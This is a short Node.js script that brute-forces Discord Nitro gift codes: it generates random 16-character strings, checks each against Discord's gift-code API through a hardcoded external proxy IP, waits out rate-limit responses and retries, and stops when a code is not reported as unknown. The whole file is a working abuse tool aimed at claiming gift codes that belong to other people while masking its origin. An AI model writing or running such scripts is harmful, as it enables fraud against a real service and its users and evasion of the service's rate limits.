const request = require('request');
const timers = require('timers');
const colors = require('colors');

colors.setTheme({
  info: 'bgGreen',
  help: 'cyan',
  warn: 'yellow',
  success: 'bgBlue',
  error: 'red'
});

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

function checkCode (id=makeid(16)) {
  var uri = 'https://discord.com/api/v6/entitlements/gift-codes/' + id
  request(uri, { json: true, proxy:'http://52.179.18.244:8080' }, (err, res, body) => {
    if (err) { return console.log(err); }
    if (body.message.includes ("Unknown")) {
      console.warn ("======> [ERR] ".warn + id.warn + " not valid.".warn)
      timers.setTimeout(checkCode, 10000)
    } else if (body.message.includes ('rate')) {
      console.warn("======> [WARN] You are being rate limited. Sleeping for ".error + body.retry_after.toString().error + " ms".error);
      timers.setTimeout(checkCode, body.retry_after, id)
    }

    else {
      console.log("======> [RES] Possible resolution?".success)
      console.log ("======> [STACK TRACE] CODE: " + id.success)
      console.log (body);
      process.exit(22);
    }
  });
}

checkCode();
